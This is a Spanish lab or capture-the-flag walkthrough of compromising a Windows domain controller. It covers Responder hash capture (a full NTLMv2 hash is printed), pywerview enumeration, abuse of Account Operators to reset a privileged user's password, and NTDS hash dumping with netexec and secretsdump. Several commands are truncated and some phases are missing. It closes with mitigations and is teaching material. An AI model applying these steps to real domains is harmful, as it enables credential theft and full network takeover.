# 🖥️ Máquina: dc03

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Windows — Active Directory  
> **Categoría:** Active Directory  
> **Técnicas trabajadas:** Responder (captura NTLMv2) · Cracking NTLMv2 (john) · pywerview (enumeración AD) · ldapdomaindump · Account Operators abuse · impacket-changepasswd · netexec --ntds · impacket-secretsdump · Pass-the-Hash · evil-winrm  
> **Descripción:** En esta práctica atacaremos un controlador de dominio Windows. Usaremos Responder para capturar un hash NTLMv2 sin credenciales previas, lo crackearemos con john, enumeraremos el dominio con pywerview para identificar usuarios privilegiados y finalmente explotaremos la pertenencia al grupo Account Operators para cambiar la contraseña de un usuario con acceso de administrador de dominio, completando el compromiso total del DC.

## 🕸️ Fase 2: Captura de hash NTLMv2 con Responder

Responder es una herramienta que actúa como servidor LLMNR, NBT-NS y MDNS malicioso en la red local. Cuando un equipo de la red intenta resolver un nombre de host que no existe en DNS (por ejemplo, al acceder a un recurso compartido mal escrito), Windows difunde la consulta por LLMNR/NBT-NS. Responder responde a esas consultas haciéndose pasar por el destino y fuerza al cliente a autenticarse, capturando el hash NTLMv2 del usuario que inició la petición. Este hash puede crackear offline sin interactuar más con la víctima.

Puede tardar un tiempo en obtener algo, se quedará esperando eventos:

```bash
sudo responder -I eth0
```

```text

[SMB] NTLMv2-SSP Username : soupedecode\xkate578
[SMB] NTLMv2-SSP Hash     : xkate578::soupedecode:492c101a52b562ae:41717A27134D2ACDF3B99510B02DA594:01010000000000000001D116EBEFDA014360A03370E808FF0000000002000800500047004500500001001E00570049004E002D0054005A00350038003800310038004E0037004800530004003400570049004E002D0054005A00350038003800310038004E003700480053002E0050004700450050002E004C004F00430041004C000300140050004700450050002E004C004F00430041004C000500140050004700450050002E004C004F00430041004C00070008000001D116EBEFDA01060004000200000008003000300000000000000000000000004000003CEE8154F822DEC01AC79EC994C536281E185A553752F392E2FA397A2C2250D80A0010000000000000000000000000000000000009001E0063006900660073002F00460069006C0065005300650072007600650072000000000000000000
```

```bash

```


## 🗂️ Fase 4: Enumeración del dominio con pywerview

pywerview es una implementación en Python de las funciones de PowerView, una herramienta clásica de enumeración de Active Directory. Permite consultar usuarios, grupos, políticas y controladores de dominio usando autenticación LDAP/SMB, sin necesidad de ejecutar nada en el sistema objetivo:

```bash
mkdir addump
```

```bash
cd addump
```

```bash
sudo apt update && sudo apt install python3-pywerview
```

Empezamos viendo las políticas de seguridad del dominio:

```bash
pywerview get-domainpolicy -d SOUPEDECODE.LOCAL -u
```

Información de los controladores de dominio:

```bash
pywerview get-netdomaincontroller -d SOUPEDECODE.LOCAL -u
```

Listado de usuarios:

```bash
pywerview get-netuser -d SOUPEDECODE.LOCAL -u
```

Información del usuario del que tenemos las credenciales:

```bash
pywerview get-netuser -d SOUPEDECODE.LOCAL -u
```

> [!info] Resultado
> Vemos que pertenece al grupo operadores de cuenta:
> memberof: CN=Account Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL
> ¿Qué es el grupo Account Operators?
> Es un grupo privilegiado local en Active Directory. Los miembros de este grupo pueden:
> · Crear, modificar y eliminar cuentas de usuario y grupo en el dominio.
> · Restablecer contraseñas de otros usuarios (¡muy importante!).
> · Administrar algunas configuraciones de equipos dentro del dominio.
> No tienen permisos totales de administrador de dominio, pero sí acceso significativo para escalar privilegios si se combina con otras debilidades del dominio.

Listado de grupos:

```bash
pywerview get-netgroup -d SOUPEDECODE.LOCAL -u
```

Miembros de administradores de dominio:

```bash
pywerview get-netgroupmember -d SOUPEDECODE.LOCAL -u
```

```bash
pywerview get-netgroupmember -d SOUPEDECODE.LOCAL -u
```

> [!info] Resultado
> Hay un grupo Operators que forma parte de Administradores de Dominio. Vamos a ver quién está en ese grupo:

```bash
pywerview get-netgroupmember -d SOUPEDECODE.LOCAL -u
```

```text
groupdomain:  SOUPEDECODE.LOCAL
groupname:    Operators
membername:   fbeth103
memberdomain: SOUPEDECODE.LOCAL
isgroup:      False
memberdn:     CN=Fanny Beth,CN=Users,DC=SOUPEDECODE,DC=LOCAL
objectsid:    S-1-5-21-2986980474-46765180-2505414164-1221
```

> [!info] Resultado
> Un usuario llamado fbeth103 que pertenece al grupo Operators que a su vez pertenece a administradores de dominio. Sería un usuario objetivo para tener el control de todo el dominio.

## ⚡ Fase 5: Escalada — Account Operators abuse + cambio de contraseña

> [!warning] Advertencia
> ⚠️ IMPORTANTE: En este punto hay un problema en la VM por lo que hay que volver a importarla ya que el usuario fbeth103 se bloquea y no se puede seguir. Revisar al importarla que la IP no ha cambiado y si lo ha hecho hay que volver a modificarla también en /etc/hosts. Completar esta fase antes de que pasen 10 minutos desde el arranque.

El objetivo es el usuario fbeth103. Como nuestro usuario xkate578 es del grupo Account Operators podemos cambiar la contraseña de fbeth103 por una conocida. impacket-changepasswd permite cambiar contraseñas de otros usuarios usando los privilegios del grupo Account Operators a través del protocolo RPC. La nueva contraseña debe cumplir las políticas de contraseñas del dominio (mayúsculas, minúsculas, números y símbolos):

```bash
impacket-changepasswd
```

```text
Impacket v0.12.0.dev1 - Copyright 2023 Fortra
[*] Setting the password of soupedecode.local\fbeth103 as soupedecode.local\xkate578
[*] Connecting to DCE/RPC as soupedecode.local\xkate578
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
```

Una vez cambiada la contraseña comprobamos que funciona:

```bash
netexec smb soupedecode.local -u
```

```text
SMB  10.0.0.14  445  DC01  [+] SOUPEDECODE.LOCAL\fbeth103:Password_123 (Pwn3d!)
```

> [!info] Resultado
> No sólo funciona sino que tenemos Pwned! por lo que el usuario tiene privilegios elevados.

Ahora por WinRM:

```bash
netexec winrm soupedecode.local -u
```

```text
WINRM  10.0.0.14  5985  DC01  [+] SOUPEDECODE.LOCAL\fbeth103:Password_123 (Pwn3d!)
```

## 🗄️ Fase 6: Volcado de hashes del dominio

Vamos a sacar los hashes de todos los usuarios del dominio. Podemos hacerlo con netexec o con impacket-secretsdump:

```bash
netexec smb soupedecode.local -u
```

```text
SMB  10.0.0.14  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2176416a80e4f62804f101d3a55d6c93:::
```

```bash
impacket-secretsdump soupedecode.local/fbeth103@soupedecode.local | grep -B2 Administrator
```

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
	Este administrador es local y es una cuenta NO habilitada por lo que no nos sirve
--
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2176416a80e4f62804f101d3a55d6c93:::
	Esta si es la cuenta del administrador del dominio
```

> [!info] Resultado
> Hay dos entradas de Administrator: la primera es la cuenta local del equipo (no habilitada), la segunda es la cuenta del administrador del dominio. Usamos el hash de la segunda.

## 📝 Conclusión general

> [!info] Resultado
> El laboratorio representa un flujo típico de penetración en un entorno Windows AD:
> · Enumeración inicial mediante Nmap, LDAP y PywerView para mapear usuarios, grupos y políticas de dominio.
> · Obtención de credenciales: captura de hash NTLMv2 con Responder y cracking con john permitió acceder a un usuario con privilegios moderados (xkate578).
> · Explotación de privilegios: la pertenencia a Account Operators permitió cambiar la contraseña de otro usuario (fbeth103) con mayores privilegios.
> · Escalada a administrador: usando la cuenta fbeth103 se extrajeron los hashes NTLM y se obtuvo acceso completo a Administrator.
> · Extracción de flags: se recuperaron las flags de usuario y root, completando el CTF.
> Mitigaciones importantes:
> · No permitir cuentas con privilegios elevados innecesarios, como Account Operators, sin controles estrictos.
> · No usar contraseñas débiles o fácilmente crackeables.
> · Implementar políticas de bloqueo de cuentas y monitoreo de actividad de privilegios.
> · Mantener SMB Signing, Kerberos seguro y controles de acceso estrictos en shares.
> El escenario demuestra cómo un atacante puede escalar desde un usuario con privilegios moderados hasta control total del DC, combinando técnicas de captura y cracking de hashes, explotación de privilegios de grupo, y dumping de hashes de Active Directory.
